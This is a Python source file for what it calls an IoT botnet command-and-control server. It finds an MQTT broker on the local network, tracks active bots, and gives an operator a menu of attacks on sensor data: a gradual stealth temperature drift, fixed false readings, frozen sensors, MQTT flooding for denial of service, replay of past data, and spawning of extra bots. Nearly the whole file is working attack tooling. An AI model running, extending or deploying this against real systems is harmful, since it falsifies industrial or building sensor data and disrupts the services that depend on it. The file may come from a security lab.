# c2/server.py
import json
import time
import threading
import sys
import os

# Résolution des imports pour lancement depuis la racine
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from protocols.mqtt_client import MQTTInterface
from config import settings
from analysis.sniffer import discover_iot_services

class BotnetC2:
    def __init__(self):
        self.running = True
        self.net = None
        self.active_bots = set()
        self.drift_active = False
        self.current_drift_bias = 0.0
        self.broker_ip = None

    def on_message(self, client, userdata, msg):
        """Réception de l'inventaire des bots actifs"""
        if msg.topic == "botnet/inventory":
            try:
                data = json.loads(msg.payload.decode())
                bot_id = data.get("bot_id")
                if bot_id:
                    self.active_bots.add(bot_id)
            except:
                pass

    def send_command(self, mode, params):
        """Envoie une commande structurée sur le topic C2"""
        if self.net:
            payload = {
                "target": "all",
                "mode": mode,
                "params": params
            }
            self.net.publish(settings.MQTT_CONFIG["topic_c2"], json.dumps(payload))

    def stealth_drift_worker(self):
        """Thread gérant l'augmentation progressive de la température"""
        while self.drift_active:
            self.send_command("ATTACK", {"bias": self.current_drift_bias, "timestamp": time.time()})
            time.sleep(60)
            if self.drift_active:
                self.current_drift_bias += 0.1

    def start(self):
        # 1. Découverte automatique du broker
        print("[*] C2 : Recherche du broker sur le réseau...")
        services = discover_iot_services(settings.NETWORK_PREFIX)
        
        # Correction du unpacking pour éviter l'erreur "too many values to unpack"
        for ip, s in services:
            if s == "MQTT":
                self.broker_ip = ip
                break
        
        if not self.broker_ip:
            print("[!] Erreur : Aucun Broker MQTT détecté. Vérifiez votre réseau.")
            return

        # 2. Connexion MQTT
        self.net = MQTTInterface("C2_MASTER", settings.MQTT_CONFIG)
        self.net.connect(self.broker_ip, 1883)
        self.net.client.subscribe("botnet/inventory")
        self.net.client.on_message = self.on_message
        self.net.client.loop_start()

        # 3. Interface de contrôle
        while self.running:
            os.system('clear' if os.name == 'posix' else 'cls')
            print("="*50)
            print(f"   IOT C2 SERVER | BROKER: {self.broker_ip}")
            print(f"   BOTS EN LIGNE: {len(self.active_bots)} | DRIFT: {'ON' if self.drift_active else 'OFF'}")
            if self.drift_active:
                print(f"   BIAIS ACTUEL : +{round(self.current_drift_bias, 1)}°C")
            print("="*50)
            print("1: STEALTH DRIFT (+0.1°C/min)")
            print("2: INJECTION MANUELLE (Valeurs fixes)")
            print("3: DATA FREEZING (Geler les capteurs)")
            print("4: MQTT FLOODING (Déni de Service)")
            print("5: REPLAY ATTACK (Rejouer l'historique)")
            print("6: SPAWN NEW BOTS (Ajouter des clones)")
            print("7: RESET / NORMAL MODE")
            print("q: Quitter")
            print("-" * 50)
            
            choice = input("\nAction > ")

            if choice == "1":
                if not self.drift_active:
                    self.drift_active = True
                    self.current_drift_bias = 0.1
                    threading.Thread(target=self.stealth_drift_worker, daemon=True).start()
                    print("[+] Stealth Drift activé.")
                else:
                    print("[!] Déjà actif.")
                time.sleep(1)

            elif choice == "2":
                self.drift_active = False
                try:
                    t = float(input("Température cible (°C) : "))
                    h = float(input("Humidité cible (%) : "))
                    p = float(input("Pression cible (hPa) : "))
                    self.send_command("ATTACK", {"temp": t, "hum": h, "pres": p, "manual": True})
                    print(f"\n[!] Injection envoyée : T={t}, H={h}, P={p}")
                except ValueError:
                    print("[!] Erreur : Saisie invalide.")
                time.sleep(2)

            elif choice == "3":
                self.drift_active = False
                self.send_command("FREEZE", {})
                print("[!] Attaque FREEZE envoyée.")
                time.sleep(1)

            elif choice == "4":
                self.drift_active = False
                self.send_command("FLOOD", {"bias": 10.0})
                print("[!!!] MQTT FLOODING EN COURS...")
                time.sleep(2)

            elif choice == "5":
                self.drift_active = False
                self.send_command("REPLAY", {})
                print("[!] Ordre REPLAY envoyé aux bots.")
                time.sleep(2)

            elif choice == "6":
                try:
                    n = int(input("Combien de bots supplémentaires ? : "))
                    # Envoi au BotManager via le topic de gestion
                    payload = {"action": "SPAWN", "count": n}
                    self.net.publish("botnet/manage", json.dumps(payload))
                    print(f"[*] Demande de {n} nouveaux bots envoyée.")
                except:
                    print("[!] Erreur de saisie.")
                time.sleep(1)

            elif choice == "7":
                self.drift_active = False
                self.current_drift_bias = 0.0
                self.send_command("NORMAL", {"bias": 0})
                print("[*] Retour au mode normal envoyé.")
                time.sleep(1)

            elif choice == "q":
                self.running = False

        self.net.client.loop_stop()
        print("[*] C2 déconnecté.")

if __name__ == "__main__":
    try:
        BotnetC2().start()
    except KeyboardInterrupt:
        sys.exit(0)
